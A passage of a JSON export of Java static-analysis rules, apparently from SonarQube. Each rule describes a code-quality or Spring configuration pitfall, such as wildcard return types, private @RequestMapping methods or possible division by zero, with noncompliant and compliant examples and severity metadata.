            "htmlDesc": "<p>It is highly recommended <strong>not</strong> to use wildcard types as return types. Because the type inference rules are fairly complex it is\nunlikely the user of that API will know how to use it correctly. </p>\n<p>Let's take the example of method returning a \"List&lt;? extends Animal&gt;\". Is it possible on this list to add a Dog, a Cat, ... we simply don't\nknow. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard types should be limited to method\nparameters.</p>\n<p>This rule raises an issue when a method returns a wildcard type. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;? extends Animal&gt; getAnimals(){...}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;Animal&gt; getAnimals(){...}\n</pre>\n<p>or</p>\n<pre>\nList&lt;Dog&gt; getAnimals(){...}\n</pre>",
            "mdDesc": "<p>It is highly recommended <strong>not</strong> to use wildcard types as return types. Because the type inference rules are fairly complex it is\nunlikely the user of that API will know how to use it correctly. </p>\n<p>Let's take the example of method returning a \"List&lt;? extends Animal&gt;\". Is it possible on this list to add a Dog, a Cat, ... we simply don't\nknow. And neither does the compiler, which is why it will not allow such a direct use. The use of wildcard types should be limited to method\nparameters.</p>\n<p>This rule raises an issue when a method returns a wildcard type. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList&lt;? extends Animal&gt; getAnimals(){...}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;Animal&gt; getAnimals(){...}\n</pre>\n<p>or</p>\n<pre>\nList&lt;Dog&gt; getAnimals(){...}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3753",
            "repo": "java",
            "name": "\"@Controller\" classes that use \"@SessionAttributes\" must call \"setComplete\" on their \"SessionStatus\" objects",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A Spring <code>@Controller</code> that uses <code>@SessionAttributes</code> is designed to handle a stateful / multi-post form. Such\n<code>@Controller</code>s use the specified <code>@SessionAttributes</code> to store data on the server between requests. That data should be cleaned\nup when the session is over, but unless <code>setComplete()</code> is called on the <code>SessionStatus</code> object from a\n<code>@RequestMapping</code> method, neither Spring nor the JVM will know it's time to do that. Note that the <code>SessionStatus</code> object must\nbe passed to that method as a parameter.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")  // Noncompliant; this doesn't get cleaned up\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n\n  @RequestMapping(\"/goodbye\", method = POST)\n  public String goodbye(SessionStatus status) {\n    //...\n    status.setComplete();\n  }\n\n}\n</pre>",
            "mdDesc": "<p>A Spring <code>@Controller</code> that uses <code>@SessionAttributes</code> is designed to handle a stateful / multi-post form. Such\n<code>@Controller</code>s use the specified <code>@SessionAttributes</code> to store data on the server between requests. That data should be cleaned\nup when the session is over, but unless <code>setComplete()</code> is called on the <code>SessionStatus</code> object from a\n<code>@RequestMapping</code> method, neither Spring nor the JVM will know it's time to do that. Note that the <code>SessionStatus</code> object must\nbe passed to that method as a parameter.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")  // Noncompliant; this doesn't get cleaned up\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n\n  @RequestMapping(\"/goodbye\", method = POST)\n  public String goodbye(SessionStatus status) {\n    //...\n    status.setComplete();\n  }\n\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1210",
            "repo": "java",
            "name": "\"equals(Object obj)\" should be overridden along with the \"compareTo(T obj)\" method",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>\n<blockquote>\n  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>\n  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>\n  <p>The recommended language is \"Note: this class has a natural ordering that is inconsistent with equals.\" </p>\n</blockquote>\n<p>If this rule is violated, weird and unpredictable failures can occur.</p>\n<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on\n<code>equals()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Compliant\n\n  @Override\n  public boolean equals(Object obj) { /* ... */ }\n}\n</pre>",
            "mdDesc": "<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>\n<blockquote>\n  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>\n  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>\n  <p>The recommended language is \"Note: this class has a natural ordering that is inconsistent with equals.\" </p>\n</blockquote>\n<p>If this rule is violated, weird and unpredictable failures can occur.</p>\n<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on\n<code>equals()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Compliant\n\n  @Override\n  public boolean equals(Object obj) { /* ... */ }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3750",
            "repo": "java",
            "name": "Spring \"@Controller\" classes should not use \"@Scope\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only\none instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn\nas new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the\nserver.</p>\n<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or\n<code>@Repository</code> with any value but \"singleton\". <code>@Scope(\"singleton\")</code> is redundant, but ignored.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Scope(\"prototype\")  // Noncompliant\n@Controller\npublic class HelloWorld {\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Controller\npublic class HelloWorld {\n</pre>",
            "mdDesc": "<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only\none instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn\nas new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the\nserver.</p>\n<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or\n<code>@Repository</code> with any value but \"singleton\". <code>@Scope(\"singleton\")</code> is redundant, but ignored.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Scope(\"prototype\")  // Noncompliant\n@Controller\npublic class HelloWorld {\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Controller\npublic class HelloWorld {\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1694",
            "repo": "java",
            "name": "An abstract class should have both abstract and concrete methods",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>\n<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the\n<code>abstract</code> keyword) with a private constructor.</p>\n<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Animal {  // Noncompliant; should be an interface\n  abstract void move();\n  abstract void feed();\n}\n\npublic abstract class Color {  // Noncompliant; should be concrete with a private constructor\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  public int getRed() {\n    return red;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Animal {\n  void move();\n  void feed();\n}\n\npublic class Color {\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  private Color () {}\n\n  public int getRed() {\n    return red;\n  }\n}\n\npublic abstract class Lamp {\n\n  private boolean switchLamp=false;\n\n  public abstract void glow();\n\n  public void flipSwitch() {\n    switchLamp = !switchLamp;\n    if (switchLamp) {\n      glow();\n    }\n  }\n}\n</pre>",
            "mdDesc": "<p>The purpose of an abstract class is to provide some heritable behaviors while also defining methods which must be implemented by sub-classes.</p>\n<p>A class with no abstract methods that was made abstract purely to prevent instantiation should be converted to a concrete class (i.e. remove the\n<code>abstract</code> keyword) with a private constructor.</p>\n<p>A class with only abstract methods and no inheritable behavior should be converted to an interface.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Animal {  // Noncompliant; should be an interface\n  abstract void move();\n  abstract void feed();\n}\n\npublic abstract class Color {  // Noncompliant; should be concrete with a private constructor\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  public int getRed() {\n    return red;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Animal {\n  void move();\n  void feed();\n}\n\npublic class Color {\n  private int red = 0;\n  private int green = 0;\n  private int blue = 0;\n\n  private Color () {}\n\n  public int getRed() {\n    return red;\n  }\n}\n\npublic abstract class Lamp {\n\n  private boolean switchLamp=false;\n\n  public abstract void glow();\n\n  public void flipSwitch() {\n    switchLamp = !switchLamp;\n    if (switchLamp) {\n      glow();\n    }\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3751",
            "repo": "java",
            "name": "\"@RequestMapping\" methods should be \"public\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A method with a <code>@RequestMapping</code> annotation part of a class annotated with <code>@Controller</code> (directly or indirectly through a\nmeta annotation - <code>@RestController</code> from Spring Boot is a good example) will be called to handle matching web requests. That will happen\neven if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility. </p>\n<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring\nframeworks ignore visibility in this way. For instance, if you've tried to control web access to your sensitive, <code>private</code>,\n<code>@RequestMapping</code> method by marking it <code>@Secured</code> ... it will still be called, whether or not the user is authorized to access\nit. That's because AOP proxies are not applied to non-public methods.</p>\n<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,\n<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\nprivate String greet(String greetee) {  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\npublic String greet(String greetee) {\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "mdDesc": "<p>A method with a <code>@RequestMapping</code> annotation part of a class annotated with <code>@Controller</code> (directly or indirectly through a\nmeta annotation - <code>@RestController</code> from Spring Boot is a good example) will be called to handle matching web requests. That will happen\neven if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility. </p>\n<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring\nframeworks ignore visibility in this way. For instance, if you've tried to control web access to your sensitive, <code>private</code>,\n<code>@RequestMapping</code> method by marking it <code>@Secured</code> ... it will still be called, whether or not the user is authorized to access\nit. That's because AOP proxies are not applied to non-public methods.</p>\n<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,\n<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\nprivate String greet(String greetee) {  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\npublic String greet(String greetee) {\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "owasp-a6",
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1451",
            "repo": "java",
            "name": "Track lack of copyright and license headers",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>\n<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>\n<h2>Compliant Solution</h2>\n<pre>\n/*\n * SonarQube, open source software quality management tool.\n * Copyright (C) 2008-2013 SonarSource\n * mailto:contact AT sonarsource DOT com\n *\n * SonarQube is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 3 of the License, or (at your option) any later version.\n *\n * SonarQube is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with this program; if not, write to the Free Software Foundation,\n * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n */\n</pre>",
            "mdDesc": "<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>\n<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>\n<h2>Compliant Solution</h2>\n<pre>\n/*\n * SonarQube, open source software quality management tool.\n * Copyright (C) 2008-2013 SonarSource\n * mailto:contact AT sonarsource DOT com\n *\n * SonarQube is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License as published by the Free Software Foundation; either\n * version 3 of the License, or (at your option) any later version.\n *\n * SonarQube is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with this program; if not, write to the Free Software Foundation,\n * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n */\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "headerFormat",
                    "htmlDesc": "Expected copyright and license header",
                    "type": "TEXT"
                },
                {
                    "key": "isRegularExpression",
                    "htmlDesc": "Whether the headerFormat is a regular expression",
                    "defaultValue": "false",
                    "type": "BOOLEAN"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1450",
            "repo": "java",
            "name": "Private fields only used as local variables in methods should become local variables",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class\ninformation. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n  private int a;\n  private int b;\n\n  public void doSomething(int y) {\n    a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n    ...\n  }\n\n  public void doSomethingElse(int y) {\n    b = y + 3;\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n\n  public void doSomething(int y) {\n    int a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n  }\n\n  public void doSomethingElse(int y) {\n    int b = y + 3;\n    ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise any issue on annotated field.</p>",
            "mdDesc": "<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class\ninformation. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n  private int a;\n  private int b;\n\n  public void doSomething(int y) {\n    a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n    ...\n  }\n\n  public void doSomethingElse(int y) {\n    b = y + 3;\n    ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n\n  public void doSomething(int y) {\n    int a = y + 5;\n    ...\n    if(a == 0) {\n      ...\n    }\n  }\n\n  public void doSomethingElse(int y) {\n    int b = y + 3;\n    ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise any issue on annotated field.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3518",
            "repo": "java",
            "name": "Zero should not be a possible denominator",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>If the denominator to a division or modulo operation is zero it would result in a fatal error.</p>\n<p>When working with <code>double</code> or <code>float</code>, no fatal error will be raised, but it will lead to unusual result and should be\navoided anyway.</p>\n<p>This rule supports primitive <code>int</code>, <code>long</code>, <code>double</code>, <code>float</code> as well as <code>BigDecimal</code> and\n<code>BigInteger</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n  }\n  z = 1 / z; // Noncompliant, possible division by zero\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n    z = 1;\n  }\n  z = 1 / z;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/369.html\">MITRE, CWE-369</a> - Divide by zero </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/CTZGBQ\">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not result in\n  divide-by-zero errors </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ftYxBQ\">CERT, INT33-C.</a> - Ensure that division and remainder operations do not result in\n  divide-by-zero errors </li>\n</ul>",
            "mdDesc": "<p>If the denominator to a division or modulo operation is zero it would result in a fatal error.</p>\n<p>When working with <code>double</code> or <code>float</code>, no fatal error will be raised, but it will lead to unusual result and should be\navoided anyway.</p>\n<p>This rule supports primitive <code>int</code>, <code>long</code>, <code>double</code>, <code>float</code> as well as <code>BigDecimal</code> and\n<code>BigInteger</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n  }\n  z = 1 / z; // Noncompliant, possible division by zero\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n    z = 1;\n  }\n  z = 1 / z;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/369.html\">MITRE, CWE-369</a> - Divide by zero </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/CTZGBQ\">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not result in\n  divide-by-zero errors </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ftYxBQ\">CERT, INT33-C.</a> - Ensure that division and remainder operations do not result in\n  divide-by-zero errors </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "denial-of-service"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2308",
            "repo": "java",
            "name": "\"deleteOnExit\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>\n<ul>\n  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>\n  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFile file = new File(\"file.txt\");\nfile.deleteOnExit();  // Noncompliant\n</pre>",
            "mdDesc": "<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>\n<ul>\n  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>\n  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFile file = new File(\"file.txt\");\nfile.deleteOnExit();  // Noncompliant\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1219",
            "repo": "java",
            "name": "\"switch\" statements should not contain non-case labels",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing\nerror.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what's expected\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable\n         /* ... */\n        break foo;  // this break statement doesn't relate to the nesting case TUESDAY\n         /* ... */\n    }\n    break;\n    /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  case WEDNESDAY:\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    compute(args); // put the content of the labelled \"for\" statement in a dedicated method\n    break;\n\n    /* ... */\n}\n</pre>",
